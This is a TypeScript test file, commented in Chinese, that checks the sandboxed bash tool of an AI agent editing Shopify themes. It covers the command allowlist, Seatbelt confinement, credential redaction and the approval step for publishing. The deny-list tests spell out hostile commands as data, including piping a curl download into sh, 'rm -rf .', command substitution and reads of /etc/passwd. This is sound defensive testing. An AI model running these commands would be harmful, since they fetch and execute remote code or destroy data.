/**
 * 终端与沙箱（55 §8 Q7，WP89）。
 *
 * 六组，对应交付单：
 *
 * (a) **命令 allowlist 逐条**：放行 / 拒 / 归到 `publish_theme` 那张卡。纯函数，跑得快。
 * (b) **沙箱真起一次**：真挂官方那一摞（`dsh-tool-bash` + `dsh-bash-sandbox` +
 *     `dsh-sandbox-local` + `dsh-sandbox-policy`），真跑 `shopify --version`，
 *     再试一次越界写。macOS 上选中的是 Seatbelt。
 * (c) **凭据不进事件**：令牌的值在事件日志里逐字查不到；命令跑完进程环境里也不留。
 * (d) **谁有终端**：只有 `site.shopify-theme`（与别名 `site.builder`）；客服没有。
 * (e) **发布物化成卡**：`shopify theme publish` 不直接拒，变成一条 `publish_theme`。
 * (f) **两档 headless 各一条带 shell 的运行**：进程内与子进程都跑得完。
 *
 * **不出网、不调真 Shopify**：PATH 最前面放一个假的 `shopify` 可执行文件
 * （`fixtures/fake-shopify.sh`），它只回一行字。CI 里没有 Shopify CLI 也照跑。
 */
import { chmodSync, existsSync, mkdtempSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import type { RunShell } from '@agentsws/contracts'
import { Provenance } from '@agentsws/core'
import { CompositeCredentials, envRefSource } from '@agentsws/credentials-openconnector'
import { afterEach, beforeAll, describe, expect, it } from 'vitest'
import type { DshHarness } from '../src/index.js'
import {
  BASH_TOOL,
  checkShellCommand,
  createDshRuntime,
  createHarness,
  insideRoot,
  runShell,
  SHELL_ROLE_IDS,
  shellCredentialPlan,
  subprocessAvailable,
  THEME_STORE_ENV,
  THEME_TOKEN_ENV,
  themeWorkspaceRoot,
} from '../src/index.js'
import { baseOptions, collect, FixedClock, makeRequest, recorder } from './helpers.js'

const SITE_ROLE = 'site.shopify-theme'
/** 假令牌：形状像真的（`shptka_…`），断言"事件里查不到它"时才有意义。 */
const FAKE_TOKEN = 'shptka_wp89_not_a_real_token_0123456789'
const STORE = 'glass-bowl.myshopify.com'

const roots: string[] = []
function newRoot(): string {
  const dir = mkdtempSync(join(tmpdir(), 'agentsws-theme-'))
  roots.push(dir)
  return dir
}

function shellOf(root: string, over: Partial<RunShell> = {}): RunShell {
  return { workspace_root: root, mode: 'workspace-write', store: STORE, ...over }
}

/**
 * PATH 最前面塞一个假的 `shopify`。
 *
 * 为什么不 mock `ctx.shell`：那样测的就不是沙箱了。这一层要的恰恰是"真的
 * fork 一个被 Seatbelt 关起来的 `bash -c`"，所以命令得真存在——只是它不该联网。
 */
let fakeBin: string
beforeAll(() => {
  fakeBin = mkdtempSync(join(tmpdir(), 'agentsws-fakebin-'))
  const script = join(fakeBin, 'shopify')
  writeFileSync(
    script,
    ['#!/bin/sh', 'echo "fake shopify cli $*"', 'exit 0', ''].join('\n'),
    'utf8',
  )
  chmodSync(script, 0o755)
  process.env.PATH = `${fakeBin}:${process.env.PATH ?? ''}`
})

const open: DshHarness[] = []
afterEach(async () => {
  for (const h of open.splice(0)) await h.dispose()
})

async function harnessFor(
  req: ReturnType<typeof makeRequest>,
  over: { credentials?: unknown } = {},
): Promise<{ harness: DshHarness; events: ReturnType<typeof collect>['events'] }> {
  const { sink, events } = collect()
  const rec = recorder()
  const harness = await createHarness({
    request: req,
    sink,
    provenance: new Provenance(req.id),
    options: baseOptions({
      clock: new FixedClock(),
      stage: rec.stage,
      createDraft: rec.createDraft,
      ...(over.credentials === undefined ? {} : { credentials: over.credentials }),
    }),
    buildStageIntent: () => undefined,
    buildDraftPayload: () => undefined,
    model: 'stub-v1',
    meta: {
      workspace_id: req.workspace_id,
      assignment_id: req.actor.assignment_id,
      role_id: req.actor.role_id,
      run_id: req.id,
      purpose: 'run',
    },
  })
  open.push(harness)
  return { harness, events }
}

/** 一次经完整工具流水线的 `bash` 调用（门禁在 `tools/pre-execute` 上，走的就是生产那条路）。 */
async function bash(
  harness: DshHarness,
  call_id: string,
  args: Record<string, unknown>,
): Promise<{ text: string; blocked: string | undefined }> {
  const res = await harness.gate.execute(call_id, BASH_TOOL, {
    description: 'run a command',
    ...args,
  })
  const rec = harness.gate.records.get(call_id)
  return {
    text: res.isError ? res.error.message : JSON.stringify(res.value),
    blocked: rec?.status === 'blocked' ? (rec.reason ?? '') : undefined,
  }
}

// ── (a) 命令 allowlist 逐条 ─────────────────────────────────────────────

describe('(a) 命令 allowlist（55 §8「门禁」那一行）', () => {
  const ROOT = '/data/themes/ws/shop'
  const check = (command: string, over: Record<string, unknown> = {}) =>
    checkShellCommand({ command, root: ROOT, ...over })

  it('放行：shopify theme 的读命令与"推一份未发布副本"', () => {
    for (const cmd of [
      'shopify theme list --json',
      'shopify theme pull --live',
      'shopify theme check',
      'shopify theme info',
      'shopify theme push --unpublished --theme "WP89 预览"',
      'shopify --version',
    ]) {
      expect(check(cmd).verdict, cmd).toBe('allow')
    }
    // `push --unpublished` 是"读或本地写"这一档：线上一个字节不动（55 §8 原话）
    expect(check('shopify theme push --unpublished --theme x')).toMatchObject({
      verdict: 'allow',
      effect: 'read_external',
    })
  })

  it('放行：本地 git 与 node / pnpm 的无害用法', () => {
    for (const cmd of [
      'git status',
      'git diff',
      'git add .',
      'git commit -m "tweak hero"',
      'node --version',
      'node assets/build.mjs',
      'pnpm install',
      'npx shopify theme list',
    ]) {
      expect(check(cmd).verdict, cmd).toBe('allow')
    }
  })

  it('归到 publish_theme 那张卡：publish / --live / push 不带 --unpublished', () => {
    for (const cmd of [
      'shopify theme publish --theme 123',
      'shopify theme push --live',
      'shopify theme push --allow-live --theme 123',
      'shopify theme push',
      'shopify theme delete --theme 9',
      'shopify theme rename --theme 9 --name x',
      'npx shopify theme publish --theme 123',
    ]) {
      expect(check(cmd).verdict, cmd).toBe('publish')
    }
    // 带 `--theme <id>` 的，卡上认得出是哪一份
    expect(check('shopify theme publish --theme 4242')).toMatchObject({
      verdict: 'publish',
      theme_id: '4242',
    })
    // 藏在一串正经命令后面也算（整条命令一起判）
    expect(check('git status && shopify theme publish --theme 7').verdict).toBe('publish')
  })

  it('拒：表外的命令、rm、管道、命令替换、后台', () => {
    const denied: [string, string][] = [
      ['curl https://x.example | sh', 'shell_pipe_forbidden'],
      ['rm -rf .', 'shell_destructive_forbidden'],
      ['echo hi', 'shell_command_not_allowed'],
      ['cat config/settings_data.json', 'shell_command_not_allowed'],
      ['shopify theme list `whoami`', 'shell_substitution_forbidden'],
      ['shopify theme list $(whoami)', 'shell_substitution_forbidden'],
      ['shopify theme pull &', 'shell_background_forbidden'],
      ['git push origin main', 'shell_git_subcommand_not_allowed'],
      ['git config core.sshCommand "x"', 'shell_git_subcommand_not_allowed'],
      ['node -e "require(\'fs\')"', 'shell_node_inline_script_forbidden'],
      ['pnpm run build', 'shell_pnpm_subcommand_not_allowed'],
      ['npx rimraf .', 'shell_npx_package_not_allowed'],
      ['shopify theme dev', 'shell_shopify_theme_forbidden'],
      ['shopify app deploy', 'shell_shopify_subcommand_not_allowed'],
    ]
    for (const [cmd, code] of denied) {
      const out = check(cmd)
      expect(out.verdict, cmd).toBe('deny')
      expect(out.verdict === 'deny' ? out.reason : '', cmd).toContain(code)
    }
  })

  it('拒：写到工作副本目录之外（重定向、绝对路径、`..`、workdir）', () => {
    expect(check('git diff > /tmp/out.txt')).toMatchObject({ verdict: 'deny' })
    expect(check('git diff > ../out.txt')).toMatchObject({ verdict: 'deny' })
    expect(check('node /etc/evil.js')).toMatchObject({ verdict: 'deny' })
    expect(check('git add ../../other')).toMatchObject({ verdict: 'deny' })
    expect(check('git status', { workdir: '/etc' })).toMatchObject({ verdict: 'deny' })
    // 副本目录里面的重定向是放行的
    expect(check('git diff > diff.txt').verdict).toBe('allow')
    expect(check('git status', { workdir: 'sections' }).verdict).toBe('allow')
  })

  it('拒：升档与后台（沙箱只有 read-only / workspace-write 两档）', () => {
    expect(check('shopify theme list', { sandboxPermissions: 'danger-full-access' })).toMatchObject(
      { verdict: 'deny' },
    )
    expect(check('shopify theme list', { background: true })).toMatchObject({ verdict: 'deny' })
  })

  it('insideRoot：`~` 一律不算在里面（沙箱不认它，我们也不认）', () => {
    expect(insideRoot(ROOT, 'sections/a.liquid')).toBe(true)
    expect(insideRoot(ROOT, `${ROOT}/a`)).toBe(true)
    expect(insideRoot(ROOT, '~/a')).toBe(false)
    expect(insideRoot(ROOT, '/etc/passwd')).toBe(false)
  })

  it('工作副本目录：按品牌与店铺分开（52 O1），店铺名里的 `../` 出不去', () => {
    const a = themeWorkspaceRoot('/data', 'ws_a', STORE)
    const b = themeWorkspaceRoot('/data', 'ws_b', STORE)
    expect(a).not.toBe(b)
    expect(themeWorkspaceRoot('/data', 'ws', '../../etc')).not.toContain('..')
  })
})

// ── (d) 谁有终端 ───────────────────────────────────────────────────────

describe('(d) 只有建站与主题那条职责有终端（55 §8「谁需要」）', () => {
  it('SHELL_ROLE_IDS 就是正名 + 别名两条', () => {
    expect([...SHELL_ROLE_IDS].sort()).toEqual(['site.builder', 'site.shopify-theme'])
  })

  it('客服职责即使请求里带了 shell 也不挂（"谁能跑"不由请求方说了算）', async () => {
    const root = newRoot()
    const req = makeRequest({ shell: shellOf(root) })
    expect(req.actor.role_id).toBe('dtc.support')
    expect(runShell(req)).toBeUndefined()
    const { harness } = await harnessFor(req)
    expect(harness.ctx.get('shell')).toBeUndefined()
    expect(harness.ctx.get('sandbox')).toBeUndefined()
    expect(harness.ctx.tools.schemas(harness.agent as never).map((s) => s.name)).not.toContain(
      BASH_TOOL,
    )
  }, 60_000)

  it('建站职责不给 shell 字段 → 整层终端都不存在（不用的东西不挂）', async () => {
    const req = makeRequest({ role_id: SITE_ROLE })
    const { harness } = await harnessFor(req)
    expect(harness.ctx.get('sandbox')).toBeUndefined()
    expect(harness.ctx.tools.schemas(harness.agent as never).map((s) => s.name)).not.toContain(
      BASH_TOOL,
    )
  }, 60_000)

  it('建站职责 + shell → `bash` 在模型面前（过了 restrict 那一关）', async () => {
    const root = newRoot()
    const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root) })
    const { harness } = await harnessFor(req)
    expect(harness.ctx.tools.schemas(harness.agent as never).map((s) => s.name)).toContain(
      BASH_TOOL,
    )
    // 档位那一段进了 persona（complete 段），模型知道只能在哪写
    const text = await harness.systemText()
    expect(text).toContain('终端（主题工作副本）')
    expect(text).toContain(root)
    expect(text).toContain(STORE)
  }, 60_000)
})

// ── (b) 沙箱真起一次 ───────────────────────────────────────────────────

describe('(b) 沙箱真的把命令关起来了（macOS = Seatbelt）', () => {
  it('放行的命令真跑起来了，越界写被内核挡下', async () => {
    const root = newRoot()
    const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root) })
    const { harness } = await harnessFor(req)

    // ① 放行：假 CLI 真的被 fork 起来了（PATH 前面那一个）
    const ok = await bash(harness, 'c1', { command: 'shopify --version' })
    expect(ok.blocked).toBeUndefined()
    expect(ok.text).toContain('fake shopify cli')

    // ② 副本目录里写得进去
    const inside = await bash(harness, 'c2', { command: 'git diff > diff.txt' })
    expect(inside.blocked).toBeUndefined()
    expect(existsSync(join(root, 'diff.txt'))).toBe(true)

    // ③ 越界写：allowlist 这一道先拦（人话理由），命令根本没跑
    const outsidePath = join(homedir(), `.agentsws-wp89-${Date.now()}.txt`)
    const denied = await bash(harness, 'c3', { command: `git diff > ${outsidePath}` })
    expect(denied.blocked).toContain('shell_write_outside_workspace')
    expect(existsSync(outsidePath)).toBe(false)

    // ④ 第二道（沙箱本身）：直接问执行器要一次越界写，内核说不行。
    //    这一条测的是"笼子真的在"，不是我们的 allowlist——所以绕开门禁直接调 ctx.shell。
    //    WP132（dsh 0.1.7-rc.1）：上游把 `run()` / `start()` 合成了 `execute()`，
    //    前台结果改由句柄上的 `result()` 给（`dsh-shell` 的 `ShellExecution`）。断言不动。
    const shellSvc = harness.ctx.shell as unknown as {
      resolve(r: unknown): { sandboxPolicy?: { mode: string } }
      execute(s: unknown): Promise<{
        result(): Promise<{ stderr: { text: string }; sandbox?: { enforcement: string } }>
      }>
    }
    const spec = shellSvc.resolve({ command: `echo nope > ${outsidePath}`, workdir: root })
    expect(spec.sandboxPolicy?.mode).toBe('workspace-write')
    const out = await (await shellSvc.execute(spec)).result()
    expect(existsSync(outsidePath)).toBe(false)
    expect(out.stderr.text.toLowerCase()).toContain('operation not permitted')
    // 上游把"管住了多少"当事实报出来；macOS Seatbelt 是 full
    expect(out.sandbox?.enforcement).toBe('full')
  }, 90_000)

  it('表外的命令在门禁就被拦下，子进程一次都没起', async () => {
    const root = newRoot()
    const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root) })
    const { harness } = await harnessFor(req)
    const marker = join(root, 'should-not-exist.txt')
    const res = await bash(harness, 'c1', { command: `touch ${marker}` })
    expect(res.blocked).toContain('shell_command_not_allowed')
    expect(existsSync(marker)).toBe(false)
  }, 60_000)
})

// ── (e) 发布物化成卡 ───────────────────────────────────────────────────

describe('(e) 发布不直接拒，变成一张 publish_theme 的卡（43 + 15 §2）', () => {
  it('`shopify theme publish` → change.staged{publish_theme}，命令本身不跑', async () => {
    const root = newRoot()
    const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root) })
    const { sink, events } = collect()
    const rec = recorder()
    const harness = await createHarness({
      request: req,
      sink,
      provenance: new Provenance(req.id),
      options: baseOptions({
        clock: new FixedClock(),
        stage: rec.stage,
        createDraft: rec.createDraft,
      }),
      buildStageIntent: () => undefined,
      buildDraftPayload: () => undefined,
      model: 'stub-v1',
      meta: {
        workspace_id: req.workspace_id,
        assignment_id: req.actor.assignment_id,
        role_id: req.actor.role_id,
        run_id: req.id,
        purpose: 'run',
      },
    })
    open.push(harness)

    const res = await bash(harness, 'c1', { command: 'shopify theme publish --theme 4242' })
    expect(res.blocked).toContain('theme_publish_needs_approval')
    expect(rec.staged).toHaveLength(1)
    expect(rec.staged[0]?.kind).toBe('publish_theme')
    expect(rec.staged[0]?.target).toEqual({ type: 'theme', id: '4242' })
    // 15 §1：`before` 不编——线上那一份由服务端 proposePublish() 真读一次补上
    expect(rec.staged[0]?.before).toBeNull()
    expect(events.some((e) => e.type === 'change.staged')).toBe(true)
    expect(harness.gate.outputs.some((o) => o.kind === 'staged_change')).toBe(true)

    // 同一条命令重试不会变成第二张卡
    await bash(harness, 'c2', { command: 'shopify theme publish --theme 4242' })
    expect(rec.staged).toHaveLength(1)
  }, 60_000)
})

// ── (c) 凭据不进事件 ───────────────────────────────────────────────────

describe('(c) 凭据不经模型、不进事件（13 §4）', () => {
  it('令牌进了子进程环境，但事件日志里逐字查不到；命令跑完进程环境也不留', async () => {
    const root = newRoot()
    const req = makeRequest({
      role_id: SITE_ROLE,
      shell: shellOf(root, { env_refs: { [THEME_TOKEN_ENV]: 'SHOPIFY_THEME_TOKEN_REF' } }),
    })
    process.env.SHOPIFY_THEME_TOKEN_REF = FAKE_TOKEN
    try {
      const credentials = class extends CompositeCredentials {
        constructor(ctx: never) {
          super(ctx, { refs: envRefSource() })
        }
      }
      const { harness, events } = await harnessFor(req, { credentials })
      // 假 CLI 把自己看到的那两个环境变量打回来（`sh` 的 `$VAR` 展开发生在子进程里）
      writeFileSync(
        join(fakeBin, 'shopify'),
        [
          '#!/bin/sh',
          `echo "token=\${${THEME_TOKEN_ENV}:-none} store=\${${THEME_STORE_ENV}:-none}"`,
          '',
        ].join('\n'),
        'utf8',
      )
      chmodSync(join(fakeBin, 'shopify'), 0o755)
      const res = await bash(harness, 'c1', { command: 'shopify theme list' })
      expect(res.blocked).toBeUndefined()
      expect(res.text).toContain(`store=${STORE}`)
      expect(res.text).toContain(`token=${FAKE_TOKEN}`)

      // 事件日志里一个字都没有（17 §2 的事件是我们的真源）
      const log = JSON.stringify(events)
      expect(log).not.toContain(FAKE_TOKEN)
      expect(log).not.toContain(THEME_TOKEN_ENV)

      // 令牌**一次都没进过这个进程的环境**（走的是执行器的显式 env，见 shell.ts）
      expect(process.env[THEME_TOKEN_ENV]).toBeUndefined()
      expect(process.env[THEME_STORE_ENV]).toBeUndefined()
      // 命令跑完，执行器上那一跳的值也清空了
      const res2 = await bash(harness, 'c2', { command: 'git status' })
      expect(res2.blocked).toBeUndefined()
    } finally {
      delete process.env.SHOPIFY_THEME_TOKEN_REF
      writeFileSync(
        join(fakeBin, 'shopify'),
        ['#!/bin/sh', 'echo "fake shopify cli $*"', 'exit 0', ''].join('\n'),
        'utf8',
      )
      chmodSync(join(fakeBin, 'shopify'), 0o755)
    }
  }, 90_000)

  it('凭据计划里只有名字与记录地址，没有任何值', () => {
    const plan = shellCredentialPlan({
      workspace_root: '/x',
      mode: 'workspace-write',
      store: STORE,
      token_record: 'ws-test/shopify',
      env_refs: { FOO: 'FOO_REF' },
    })
    expect(plan.records[THEME_TOKEN_ENV]).toBe('ws-test/shopify')
    expect(plan.refs.FOO).toBe('FOO_REF')
    expect(JSON.stringify(plan)).not.toContain(FAKE_TOKEN)
  })
})

// ── (f) 两档 headless ─────────────────────────────────────────────────

describe('(f) 两档 headless 各跑一条带终端的运行', () => {
  it('进程内装配：带 shell 的运行跑得完', async () => {
    const root = newRoot()
    const runtime = createDshRuntime({ ...baseOptions(), mode: 'in-process' })
    const { sink, events } = collect()
    const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root), id: 'run_shell_in' })
    const result = await runtime.run(req, sink, new AbortController().signal)
    expect(result.status).not.toBe('failed')
    expect(events.some((e) => e.type === 'run.failed')).toBe(false)
    expect(JSON.stringify(events)).not.toContain(FAKE_TOKEN)
  }, 120_000)

  it.runIf(subprocessAvailable())(
    '子进程装配：同一条运行跑得完',
    async () => {
      const root = newRoot()
      const runtime = createDshRuntime({ ...baseOptions(), mode: 'subprocess' })
      const { sink, events } = collect()
      const req = makeRequest({ role_id: SITE_ROLE, shell: shellOf(root), id: 'run_shell_sub' })
      const result = await runtime.run(req, sink, new AbortController().signal)
      expect(result.status).not.toBe('failed')
      expect(events.some((e) => e.type === 'run.failed')).toBe(false)
    },
    120_000,
  )
})
